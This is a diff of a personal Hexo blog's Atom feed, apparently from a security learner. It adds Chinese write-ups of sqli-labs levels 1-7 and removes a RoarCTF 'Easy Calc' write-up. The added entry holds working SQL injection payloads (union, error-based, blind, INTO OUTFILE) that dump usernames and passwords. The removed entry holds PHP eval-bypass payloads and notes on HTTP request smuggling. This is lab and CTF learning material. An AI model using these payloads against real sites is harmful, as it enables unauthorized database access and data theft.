@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-02-01T16:49:08.174Z</updated>
+  <updated>2024-02-18T05:06:51.099Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sqli-labs</title>
+    <link href="http://example.com/2024/02/18/sqli-labs/"/>
+    <id>http://example.com/2024/02/18/sqli-labs/</id>
+    <published>2024-02-18T05:00:58.000Z</published>
+    <updated>2024-02-18T05:06:51.099Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:emails,referers,uagents,users</p><p>Your Password:3</p><p>普通的字符型联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure><p>Your Login name:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password,level,id,username,password</p><p>Your Password:3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(id,username,password),3 from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><p>和Less-1 几乎相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://sql-labs/Less-1/</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,2,group_concat(id,username,password) from security.users%23</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>输入: ?id&#x3D;1’</p><p>……..for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 </p><p>关键在: <code>&#39;  &#39;1&#39;&#39;) LIMIT 0,1 &#39;</code></p><p>系统给输入的内容增加了一个<code>&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,database()%23</span><br></pre></td></tr></table></figure><p>其余步骤与前几关相同</p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>输入单引号并不报错,而输入双引号会报错</p><p>与Less-3 类似,只不过使用了<code>&quot;)</code>包裹字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3%23</span><br></pre></td></tr></table></figure><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><p>没有回显username,报错注入秒了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>看网上还有用group by 双查询注入的</p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>Less-5的单引号闭合改为双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>也可以用extractvalue</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database()))%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))%23</span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>这关用<code>((&#39;  &#39;))</code>包裹变量</p><p>测试:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and sleep(5)%23</span><br></pre></td></tr></table></figure><p>这里很明显可以使用时间注入</p><p>不过测试了一下发现布尔盲注也是可以的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and ascii(substr(database(),1,1))&gt;1%23</span><br></pre></td></tr></table></figure><p>不过应该都是非预期,网上还有另一种方法,正是使用提示中的<code>outfile</code></p><p><strong><strong>文件上传</strong></strong></p><p>需要更改mysql的配置文件,将 secure-file-priv 置为空,即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv=</span><br></pre></td></tr></table></figure><p>之后编写payload:</p><p>1’)) union select 1,2,database() into outfile ‘文件要被保存的路径’%23</p><h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;Less-1&quot;&gt;&lt;a href=&quot;#Less-1&quot; class=&quot;headerlink&quot; title=&quot;Less-1&quot;&gt;&lt;/a&gt;Less-1&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
+      
+    
+    
+    
+    
+    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>MongoDB初体验</title>
@@ -476,30 +498,6 @@
     
     
     <category term="XXE漏洞(XML外部实体注入)" scheme="http://example.com/tags/XXE%E6%BC%8F%E6%B4%9E-XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>从一个题目中了解http请求走私</title>
-    <link href="http://example.com/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
-    <id>http://example.com/2024/01/13/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%A2%98%E7%9B%AE%E4%B8%AD%E4%BA%86%E8%A7%A3http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</id>
-    <published>2024-01-13T11:32:33.000Z</published>
-    <updated>2024-01-13T12:24:27.373Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="RoarCTF 2019]Easy Calc"></a>RoarCTF 2019]Easy Calc</h1><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>之前做过这道题,但是是使用php字符串解析来绕过</p><p>关于php字符串解析特性:</p><p><a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass</a></p><p>并且还做了一些过滤黑字符,比如<code>/</code>和反引号等等</p><p>源码&#x2F;calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>不过还是可以绕过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%20num=var_dump(scandir(chr(47)))</span><br><span class="line">/calc.php?%20num=file_get_contents(chr(47).f1agg) </span><br></pre></td></tr></table></figure><p>chr将ascii码转换为字符</p><h3 id="方法二-http请求走私"><a href="#方法二-http请求走私" class="headerlink" title="方法二:http请求走私"></a>方法二:http请求走私</h3><p>这篇文章写的非常详细:</p><p><a href="https://xz.aliyun.com/t/6654?time__1311=n4+xnD0DRDBGitGk7rDsA3o+DcC+CN3DuiAYD">从一道题到协议层攻击之HTTP请求走私</a></p><p>使用CL-CL的方式使得前端服务器</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240113201605455.png" alt="image-20240113201605455"></p><p>按照<strong>RFC7230规范</strong>,此时应该返回400错误,前端服务器也确实做了,但是仍然将请求转发给了后端,使得前端服务器的waf被绕过</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;RoarCTF 2019]Easy Ca</summary>
-      
-    
-    
-    
-    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
-    
-    
-    <category term="http请求走私" scheme="http://example.com/tags/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
     
   </entry>
   
